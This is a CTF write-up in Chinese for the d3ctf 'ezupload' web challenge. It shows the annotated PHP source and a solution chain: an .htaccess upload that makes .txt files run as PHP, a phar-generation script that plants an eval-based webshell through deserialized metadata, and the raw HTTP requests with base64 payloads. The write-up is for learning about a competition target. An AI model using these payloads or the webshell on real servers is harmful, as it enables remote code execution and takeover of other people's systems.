

```javascript
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this->userdir = "upload/" . md5($_SERVER["HTTP_X_REAL_IP"]);
        $this->url = $url;
        $this->filename  =  $filename;
//        if不存在userdir，则删除userdir
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }
//    userdir!=指定值报错
    public function checkdir(){
        if ($this->userdir != "upload/" . md5($_SERVER["HTTP_X_REAL_IP"])) {
            die('hacker!!!');
        }
    }
//如果含有scheme，scheme含有file|php，则hacker
    public function checkurl(){
//        本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。
        $r = parse_url($this->url);
//        为了过滤伪协议file|php
        if (!isset($r['scheme']) || preg_match("/file|php/i",$r['scheme'])){
            die('hacker!!!');
        }
    }
//filename中不能含有 ..|/
//为了防止跳目录
    public function checkext(){
        if (stristr($this->filename,'..')){
            die('hacker!!!');
        }
        if (stristr($this->filename,'/')){
            die('hacker!!!');
        }
//        strrposfilename最后一个.的索引值+1
//ext=.后面的字符串
//        iffilename中含有ph，hacker
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)){
            die('hacker!!!');
        }
    }

    public function upload(){
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
//        得到url里的内容
        $content = file_get_contents($this->url,NULL,NULL,0,2048);
//        if内容中含有|value|on|type|flag|auto|set|
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)){
            die('hacker!!!');
        }
//        将content写入/filename
        file_put_contents($this->userdir."/".$this->filename,$content);
    }

//
    public function remove(){
        $this->checkdir();
        $this->checkext();
//        if文件名存在，则删除
        if (file_exists($this->userdir."/".$this->filename)){
            unlink($this->userdir."/".$this->filename);
        }
    }

//
    public function count($dir) {
//        scandir列出指定路径中的文件和目录
        if ($dir === ''){
            $num = count(scandir($this->userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
//        ifnum>0，告诉你有的file数量
        if($num > 0) {
            return "you have $num files";
        }
        else{
            return "you don't have file";
        }
    }
//
    public function __toString() {
//        将scandir的内容，转为字符串输出
        return implode(" ",scandir(__DIR__."/".$this->userdir));
    }
//    析构函数，销毁时，告诉文件路径，并将文件路径写入filename.txt
    public function __destruct() {
        $string = "your file in : ".$this->userdir;
        file_put_contents($this->filename.".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'],$_POST['filename']);

//action=upload,调用upload函数
if($_POST['action'] === "upload") {
    $dir->upload();
}
//调用remove方法
elseif ($_POST['action'] === "remove") {
    $dir->remove();
}
//action=count时，还要post一个dir，dir有值则给count传参
elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])){
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}

//action=upload&url=1&filename=1
```



解题思路：

```javascript
1.上传.htaccess

2.上传phar文件

3.触发phar文件，file_get_contents读取url触发phar，在upload目录下生成.txt文件
，.txt文件内容可控

4. .htaccess内容为：
AddHandler php7-script .txt

5. 向.txt文件内写入任意内容。都被解析

```



不理解的点：

```javascript
1.没有上传框，却可以直接上传，而且要以文件上传的格式
好像是，将post的参数，读取到文件里，达到文件上传的效果

2.phar的触发
使用了phar伪协议

3..hraccess也是利用了，文件读取的方式，直接上传

4.本题有着严格的过滤
文件名中不能含有，..|ph|/。防止跳目录，和直接上传php文件。但是此时忽略了.htaccess
文件

文件内容不能含有：（url解析到的内容）
/\<\?|value|on|type|flag|auto|set|\\\\/

这里采用gzip phar文件。改文件后缀名为：1.phar.png
再把图片转换为base64的形式，上传


```







上传.htaccess

```javascript
POST / HTTP/1.1
Host: 52ba2f2dac.ezupload.d3ctf.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------18467633426500
Content-Length: 405
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/CTF/d3ctf/ezupload/upload.html
Upgrade-Insecure-Requests: 1

-----------------------------18467633426500
Content-Disposition: form-data; name="action"

upload
-----------------------------18467633426500
Content-Disposition: form-data; name="url"

data:image/png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0
-----------------------------18467633426500
Content-Disposition: form-data; name="filename"

.htaccess
-----------------------------18467633426500
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/d^3ctf/images/E63A69815EF1428AB8192DA71B711852clipboard.png)

phar文件生成脚本：

```javascript
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename)
    {
    }
}
$d3 = new dir("test", "testdd");
$d3->userdir = '<?php eval($_REQUEST[122]); phpinfo();';
$d3->filename = '/var/www/html/5c16a6252497d1e4/ca5026264e74bf2417635521b7a9154e/heibb';
$phar = new Phar("2.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"." __HALT_COMPILER(); ");
// 增加gif⽂件头
$phar->setMetadata($d3);

$str="<script language=\"php\">phpinfo();</script>";
$phar->addFromString("test.jpg",$str);
$phar->stopBuffering();
```





上传2.phar.gz

```javascript
POST / HTTP/1.1
Host: 52ba2f2dac.ezupload.d3ctf.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------18467633426500
Content-Length: 797
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/CTF/d3ctf/ezupload/upload.html
Upgrade-Insecure-Requests: 1

-----------------------------18467633426500
Content-Disposition: form-data; name="action"

upload
-----------------------------18467633426500
Content-Disposition: form-data; name="url"

data:image/png;base64,H4sICMFL3V0AAzIucGhhcgBz93SzsExUiI/3cPQJiXf29w3w9HEN0tC0VrC34+V6wcDAwAjEglCagWETEPtbGVsppWQWKQHp6mIrcyul0uLUIpCAdbGVsYWVko19QUaBQmpZYo6GSnyQa2Coa3BItKGRUSzQWKBMZl5aPtAGsGqg3qIcJWs/IBuoMS0zJzUvMTcVJGVmaaWkX5ZYpF9eXq6fUZKbo2+abGiWaGZkamRiaZ5imGqin5xoamBkZmRmkmpukpRmZGJobmZsampkmGSeaGloapKqn5GamZSkZF3LAXR1SWpxiV5WQboWkH3Q+24siPa5tIx5G8RjDDbFyUWZBSUKOYl56aWJ6am2SkCnKtkh3GujD1Fht8RnyY1VnqHqO5U8leYXOjo6J4XeYQKa4O7k6wQABx1XeFABAAA=
-----------------------------18467633426500
Content-Disposition: form-data; name="filename"

2.phar.gz
-----------------------------18467633426500

```





触发2.phar.gz

```javascript
POST / HTTP/1.1
Host: 52ba2f2dac.ezupload.d3ctf.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: http://52ba2f2dac.ezupload.d3ctf.io
Connection: close
Referer: http://52ba2f2dac.ezupload.d3ctf.io/
Upgrade-Insecure-Requests: 1

action=upload&url=phar%3A%2F%2F.%2Fupload%2F5c35db98ea2c17d49a15c38b07a2b975%2F2.phar.gz%2Ftest.jpg&filename=la3.txt
```





